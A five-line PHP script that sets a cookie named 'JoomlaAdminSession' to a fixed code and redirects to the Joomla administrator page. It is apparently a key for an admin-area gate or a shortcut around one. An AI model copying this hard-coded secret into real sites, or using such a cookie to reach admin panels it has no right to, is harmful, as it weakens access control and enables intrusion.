<?php
$admin_cookie_code="3429020892";
setcookie("JoomlaAdminSession",$admin_cookie_code,0,"/");
header("Location: /administrator/index.php");
?>